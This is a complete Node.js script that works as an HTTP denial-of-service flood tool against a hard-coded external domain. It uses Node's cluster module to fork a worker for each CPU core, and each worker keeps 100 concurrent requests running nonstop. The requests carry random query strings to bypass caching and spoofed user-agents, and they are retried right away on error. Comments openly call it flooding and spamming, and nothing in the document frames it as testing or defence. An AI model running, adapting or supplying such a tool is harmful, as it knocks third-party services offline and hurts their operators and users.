const https = require('https');
const { cpus } = require('os');
const cluster = require('cluster');
const { randomBytes } = require('crypto');

const TARGET = 'https://empire.zexcloud.one';
const CORES = cpus().length;
const INTERVAL = 5000;

if (cluster.isMaster) {
  for (let i = 0; i < CORES; i++) {
    cluster.fork();
  }
} else {
  let count = 0;

  // Logging
  setInterval(() => {
    console.log(`(${count}) requests sent to (${TARGET}) in 5 seconds`);
    count = 0;
  }, INTERVAL);

  // Flood loop
  function flood() {
    const query = '?x=' + randomBytes(8).toString('hex');
    const req = https.get(TARGET + query, {
      headers: {
        'User-Agent': `FloodJS/${Math.floor(Math.random() * 1000)}`,
        'Accept': '*/*'
      }
    }, () => {
      count++;
      req.destroy(); // Don't wait for full response
      flood();       // Immediately send another
    });

    req.on('error', () => {
      flood(); // Keep firing even on error
    });
  }

  // Start spamming
  for (let i = 0; i < 100; i++) flood(); // Spin up 100 parallel requests per core
}
